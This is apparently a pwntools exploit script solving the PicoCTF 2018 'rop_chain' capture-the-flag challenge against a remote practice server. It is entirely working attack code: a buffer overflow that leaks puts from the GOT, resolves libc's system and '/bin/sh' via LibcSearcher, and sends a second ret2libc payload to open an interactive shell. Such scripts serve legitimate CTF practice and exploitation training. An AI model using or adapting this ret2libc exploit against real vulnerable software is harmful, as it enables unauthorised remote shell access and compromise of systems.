from pwn import *
from LibcSearcher import *
context(log_level='debug', arch='amd64')

if len(sys.argv) > 1:
  conn = remote('node4.buuoj.cn', 29084 )
else:
  conn = process(sys.argv[0][:-7])
  #gdb.attach(conn)

getflag = 0x0804862b
main = 0x0804873b
elf = ELF('./PicoCTF_2018_rop_chain')
puts_plt = elf.plt['puts']
leak_got = elf.got['puts']

conn.recvuntil(b'input> ')

payload = cyclic(0x18 + 0x4) + p32(puts_plt) + p32(main) + p32(leak_got)
conn.sendline(payload)
res = conn.recv()

leak_addr = u32(res[:4])
libc = LibcSearcher('puts', leak_addr)
libc_base = leak_addr - libc.dump('puts')
system = libc_base + libc.dump('system')
binsh = libc_base +  libc.dump('str_bin_sh')

payload = cyclic(0x18 + 0x4) + p32(system) + b'aaaa' + p32(binsh)
conn.sendline(payload)
conn.interactive()
